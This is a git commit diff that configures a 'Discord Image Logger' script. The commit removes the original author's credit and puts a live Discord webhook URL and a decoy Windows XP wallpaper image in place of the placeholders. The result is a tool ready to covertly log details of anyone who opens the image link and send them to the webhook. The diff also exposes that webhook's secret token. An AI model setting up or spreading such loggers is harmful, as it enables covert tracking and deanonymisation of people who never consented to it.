acc47846ac03a26fc5e8cfa3aed0a2e6fa750af1
matas <116184613+Katchub@users.noreply.github.com>
2025-02-05 16:33:28 +0200

    Update imagelog.py

--- api/imagelog.py
+++ api/imagelog.py
@@ -1,5 +1,5 @@
 # Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1336705525185908786/OmYcEKTRHaGh4aWWfGugAkjZyd0SwNmJ4WdWaM3qbwToKeMSSEy0iy05nFs-SERctyrm",
+    "image": "https://www.newegg.com/insider/wp-content/uploads/2014/04/windows_xp_bliss-wide.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
